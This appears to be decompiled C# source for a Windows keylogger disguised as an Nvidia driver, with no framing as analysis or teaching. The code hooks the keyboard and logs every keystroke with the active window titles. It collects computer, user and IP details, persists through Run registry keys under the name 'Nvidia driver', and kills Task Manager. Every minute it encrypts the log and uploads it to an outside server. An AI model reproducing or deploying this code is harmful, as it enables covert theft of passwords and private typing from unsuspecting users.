using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Timers;
using System.Windows.Forms;
using Microsoft.Win32;

namespace nvdia;

internal class Program
{
	private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

	private const int WH_KEYBOARD_LL = 13;

	private const int WM_KEYDOWN = 256;

	private static string hWndT;

	private static string hWndTP;

	private static LowLevelKeyboardProc _proc = HookCallback;

	private static IntPtr _hookID = IntPtr.Zero;

	public static string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "nvidia.log");

	public static byte caps = 0;

	public static byte shift = 0;

	public static byte failed = 0;

	public static int count = 0;

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool UnhookWindowsHookEx(IntPtr hhk);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr GetModuleHandle(string lpModuleName);

	[DllImport("User32.dll")]
	public static extern int GetForegroundWindow();

	[DllImport("User32.dll")]
	public static extern int GetWindowText(int hwnd, StringBuilder s, int nMaxCount);

	private static void EF(string sInputFilename, string sOutputFilename, string sKey)
	{
		try
		{
			FileStream fileStream = new FileStream(sInputFilename, FileMode.Open, FileAccess.Read);
			FileStream fileStream2 = new FileStream(sOutputFilename, FileMode.Create, FileAccess.Write);
			DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
			dESCryptoServiceProvider.Key = Encoding.ASCII.GetBytes(sKey);
			dESCryptoServiceProvider.IV = Encoding.ASCII.GetBytes(sKey);
			ICryptoTransform transform = dESCryptoServiceProvider.CreateEncryptor();
			CryptoStream cryptoStream = new CryptoStream(fileStream2, transform, CryptoStreamMode.Write);
			byte[] array = new byte[fileStream.Length];
			fileStream.Read(array, 0, array.Length);
			cryptoStream.Write(array, 0, array.Length);
			cryptoStream.Close();
			fileStream.Close();
			fileStream2.Close();
		}
		catch (Exception)
		{
		}
	}

	public static void Main()
	{
		hWndT = AApT();
		hWndTP = hWndT;
		gOSI();
		_hookID = SeH(_proc);
		su();
		Timer timer = new Timer();
		timer.Elapsed += OTEv;
		timer.AutoReset = true;
		timer.Interval = 60000.0;
		timer.Start();
		Application.Run();
		GC.KeepAlive(timer);
		UnhookWindowsHookEx(_hookID);
	}

	public static string AApT()
	{
		int foregroundWindow = GetForegroundWindow();
		StringBuilder stringBuilder = new StringBuilder(1024);
		int windowText = GetWindowText(foregroundWindow, stringBuilder, stringBuilder.Capacity);
		if (windowText <= 0 || windowText > stringBuilder.Length)
		{
			return "unknown";
		}
		return stringBuilder.ToString();
	}

	public static void su()
	{
		string text = Application.get_ExecutablePath().ToString();
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		folderPath = Path.Combine(folderPath, "nvdispl.exe");
		try
		{
			File.Copy(text, folderPath, overwrite: false);
			text = folderPath;
		}
		catch
		{
		}
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			if (registryKey.GetValue("Nvidia driver") == null)
			{
				registryKey.SetValue("Nvidia driver", folderPath);
			}
			registryKey.Close();
		}
		catch
		{
		}
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			if (registryKey.GetValue("Nvidia driver") == null)
			{
				registryKey.SetValue("Nvidia driver", text);
			}
			registryKey.Close();
		}
		catch
		{
		}
	}

	public static void OTEv(object sender, EventArgs e)
	{
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		foreach (Process process in array)
		{
			if (process.MainWindowTitle.Contains("Taskmgr.exe"))
			{
				process.Kill();
			}
		}
		Random random = new Random();
		int num = random.Next(10000000, 99999999);
		new Random();
		string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), num + "1");
		EF(path, text, num.ToString());
		WebClient webClient = new WebClient();
		webClient.Headers.Add("Content-Type", "binary/octet-stream");
		try
		{
			byte[] array2 = webClient.UploadFile("http://dweb.eu5.org/data/upc.php", text);
			Encoding.UTF8.GetString(array2, 0, array2.Length);
			File.WriteAllText(path, "");
		}
		catch (Exception)
		{
		}
		try
		{
			File.Delete(text);
		}
		catch (Exception)
		{
		}
	}

	private static IntPtr SeH(LowLevelKeyboardProc proc)
	{
		using Process process = Process.GetCurrentProcess();
		using ProcessModule processModule = process.MainModule;
		return SetWindowsHookEx(13, proc, GetModuleHandle(processModule.ModuleName), 0u);
	}

	private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
	{
		//IL_00a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ad: Invalid comparison between I4 and Unknown
		//IL_00bb: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c1: Invalid comparison between Unknown and I4
		//IL_00c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ca: Invalid comparison between Unknown and I4
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cf: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dd: Expected I4, but got Unknown
		//IL_00dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Invalid comparison between Unknown and I4
		//IL_0118: Unknown result type (might be due to invalid IL or missing references)
		//IL_011c: Invalid comparison between Unknown and I4
		//IL_011e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0122: Invalid comparison between Unknown and I4
		//IL_015c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0160: Invalid comparison between Unknown and I4
		//IL_0165: Unknown result type (might be due to invalid IL or missing references)
		//IL_0169: Unknown result type (might be due to invalid IL or missing references)
		//IL_0197: Expected I4, but got Unknown
		//IL_0197: Unknown result type (might be due to invalid IL or missing references)
		//IL_019b: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ad: Expected I4, but got Unknown
		//IL_0374: Unknown result type (might be due to invalid IL or missing references)
		//IL_037b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0399: Expected I4, but got Unknown
		//IL_0399: Unknown result type (might be due to invalid IL or missing references)
		//IL_03a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c2: Expected I4, but got Unknown
		//IL_03c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_03c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_03df: Expected I4, but got Unknown
		hWndT = AApT();
		if (hWndT != hWndTP)
		{
			StreamWriter streamWriter = File.AppendText(path);
			streamWriter.WriteLine("");
			streamWriter.WriteLine("[" + hWndT + "] - " + DateTime.Now);
			streamWriter.Close();
			hWndTP = hWndT;
		}
		StreamWriter streamWriter2;
		int num;
		if (nCode >= 0 && wParam == (IntPtr)256)
		{
			streamWriter2 = File.AppendText(path);
			num = Marshal.ReadInt32(lParam);
			if (65536 == (int)Control.get_ModifierKeys())
			{
				shift = 1;
			}
			Keys val = (Keys)num;
			if ((int)val <= 32)
			{
				if ((int)val <= 13)
				{
					switch (val - 8)
					{
					case 0:
						goto IL_00f8;
					case 1:
						goto IL_0108;
					}
					if ((int)val != 13)
					{
						goto IL_03df;
					}
					streamWriter2.WriteLine("");
				}
				else if ((int)val != 20)
				{
					if ((int)val != 32)
					{
						goto IL_03df;
					}
					streamWriter2.Write(" ");
				}
				else if (caps == 0)
				{
					caps = 1;
				}
				else
				{
					caps = 0;
				}
				goto IL_0665;
			}
			if ((int)val <= 93)
			{
				switch (val - 48)
				{
				case 0:
					goto IL_01b2;
				case 1:
					goto IL_01df;
				case 2:
					goto IL_020c;
				case 3:
					goto IL_0239;
				case 4:
					goto IL_0266;
				case 5:
					goto IL_0293;
				case 6:
					goto IL_02c0;
				case 7:
					goto IL_02ed;
				case 8:
					goto IL_031a;
				case 9:
					goto IL_0347;
				}
				switch (val - 91)
				{
				case 0:
				case 1:
				case 2:
					goto IL_065a;
				}
			}
			else
			{
				switch (val - 160)
				{
				case 0:
				case 1:
				case 2:
				case 3:
				case 4:
				case 5:
					goto IL_065a;
				}
				switch (val - 186)
				{
				case 0:
					goto IL_0531;
				case 1:
					goto IL_055e;
				case 2:
					goto IL_058b;
				case 3:
					goto IL_05b8;
				case 4:
					goto IL_05e5;
				case 5:
					goto IL_060c;
				case 6:
					goto IL_0633;
				}
				switch (val - 219)
				{
				case 0:
					goto IL_049d;
				case 1:
					goto IL_04ca;
				case 2:
					goto IL_04da;
				case 3:
					goto IL_0507;
				}
			}
			goto IL_03df;
		}
		goto IL_0671;
		IL_065a:
		streamWriter2.Write("");
		goto IL_0665;
		IL_05b8:
		if (shift == 0)
		{
			streamWriter2.Write("-");
		}
		else
		{
			streamWriter2.Write("_");
		}
		goto IL_0665;
		IL_02c0:
		if (shift == 0)
		{
			streamWriter2.Write("6");
		}
		else
		{
			streamWriter2.Write("^");
		}
		goto IL_0665;
		IL_049d:
		if (shift == 0)
		{
			streamWriter2.Write("[");
		}
		else
		{
			streamWriter2.Write("{");
		}
		goto IL_0665;
		IL_0293:
		if (shift == 0)
		{
			streamWriter2.Write("5");
		}
		else
		{
			streamWriter2.Write("%");
		}
		goto IL_0665;
		IL_0633:
		if (shift == 0)
		{
			streamWriter2.Write("`");
		}
		else
		{
			streamWriter2.Write("~");
		}
		goto IL_0665;
		IL_0665:
		shift = 0;
		streamWriter2.Close();
		goto IL_0671;
		IL_0266:
		if (shift == 0)
		{
			streamWriter2.Write("4");
		}
		else
		{
			streamWriter2.Write("$");
		}
		goto IL_0665;
		IL_0108:
		streamWriter2.Write("[TAB]");
		goto IL_0665;
		IL_00f8:
		streamWriter2.Write("[back]");
		goto IL_0665;
		IL_055e:
		if (shift == 0)
		{
			streamWriter2.Write("=");
		}
		else
		{
			streamWriter2.Write("+");
		}
		goto IL_0665;
		IL_0239:
		if (shift == 0)
		{
			streamWriter2.Write("3");
		}
		else
		{
			streamWriter2.Write("#");
		}
		goto IL_0665;
		IL_060c:
		if (shift == 0)
		{
			streamWriter2.Write("/");
		}
		else
		{
			streamWriter2.Write("?");
		}
		goto IL_0665;
		IL_0671:
		return CallNextHookEx(_hookID, nCode, wParam, lParam);
		IL_020c:
		if (shift == 0)
		{
			streamWriter2.Write("2");
		}
		else
		{
			streamWriter2.Write("@");
		}
		goto IL_0665;
		IL_05e5:
		if (shift == 0)
		{
			streamWriter2.Write(".");
		}
		else
		{
			streamWriter2.Write(">");
		}
		goto IL_0665;
		IL_04da:
		if (shift == 0)
		{
			streamWriter2.Write("]");
		}
		else
		{
			streamWriter2.Write("}");
		}
		goto IL_0665;
		IL_03df:
		if (shift == 0 && caps == 0)
		{
			streamWriter2.Write(((object)(Keys)num).ToString()!.ToLower());
		}
		if (shift == 1 && caps == 0)
		{
			streamWriter2.Write(((object)(Keys)num).ToString()!.ToUpper());
		}
		if (shift == 0 && caps == 1)
		{
			streamWriter2.Write(((object)(Keys)num).ToString()!.ToUpper());
		}
		if (shift == 1 && caps == 1)
		{
			streamWriter2.Write(((object)(Keys)num).ToString()!.ToLower());
		}
		goto IL_0665;
		IL_0507:
		if (shift == 0)
		{
			streamWriter2.Write("'");
		}
		else
		{
			streamWriter2.Write('"');
		}
		goto IL_0665;
		IL_01df:
		if (shift == 0)
		{
			streamWriter2.Write("1");
		}
		else
		{
			streamWriter2.Write("!");
		}
		goto IL_0665;
		IL_0347:
		if (shift == 0)
		{
			streamWriter2.Write("9");
		}
		else
		{
			streamWriter2.Write("(");
		}
		goto IL_0665;
		IL_01b2:
		if (shift == 0)
		{
			streamWriter2.Write("0");
		}
		else
		{
			streamWriter2.Write(")");
		}
		goto IL_0665;
		IL_04ca:
		streamWriter2.Write("|");
		goto IL_0665;
		IL_031a:
		if (shift == 0)
		{
			streamWriter2.Write("8");
		}
		else
		{
			streamWriter2.Write("*");
		}
		goto IL_0665;
		IL_058b:
		if (shift == 0)
		{
			streamWriter2.Write(",");
		}
		else
		{
			streamWriter2.Write("<");
		}
		goto IL_0665;
		IL_0531:
		if (shift == 0)
		{
			streamWriter2.Write(";");
		}
		else
		{
			streamWriter2.Write(":");
		}
		goto IL_0665;
		IL_02ed:
		if (shift == 0)
		{
			streamWriter2.Write("7");
		}
		else
		{
			streamWriter2.Write("&");
		}
		goto IL_0665;
	}

	public static void gOSI()
	{
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		//IL_0036: Expected O, but got Unknown
		StreamWriter streamWriter = File.AppendText(path);
		ManagementObjectSearcher val = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				string computerName = SystemInformation.get_ComputerName();
				string userDomainName = SystemInformation.get_UserDomainName();
				string userName = SystemInformation.get_UserName();
				streamWriter.WriteLine("PCN: " + computerName);
				streamWriter.WriteLine("udn: " + userDomainName);
				streamWriter.WriteLine("un: " + userName);
				streamWriter.WriteLine(GPIP());
				if (((ManagementBaseObject)val2).get_Item("Caption") != null)
				{
					streamWriter.WriteLine("OSN:  " + ((ManagementBaseObject)val2).get_Item("Caption").ToString());
				}
				if (((ManagementBaseObject)val2).get_Item("OSArchitecture") != null)
				{
					streamWriter.WriteLine("OSArc:  " + ((ManagementBaseObject)val2).get_Item("OSArchitecture").ToString());
				}
				if (((ManagementBaseObject)val2).get_Item("CSDVersion") != null)
				{
					streamWriter.WriteLine("OSvcPc:  " + ((ManagementBaseObject)val2).get_Item("CSDVersion").ToString());
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		streamWriter.Close();
	}

	public static string GPIP()
	{
		string text = "";
		WebRequest webRequest = WebRequest.Create("http://checkip.dyndns.org/");
		using (WebResponse webResponse = webRequest.GetResponse())
		{
			using StreamReader streamReader = new StreamReader(webResponse.GetResponseStream());
			text = streamReader.ReadToEnd();
		}
		int num = text.IndexOf("Address: ") + 9;
		int num2 = text.LastIndexOf("</body>");
		return text.Substring(num, num2 - num);
	}
}
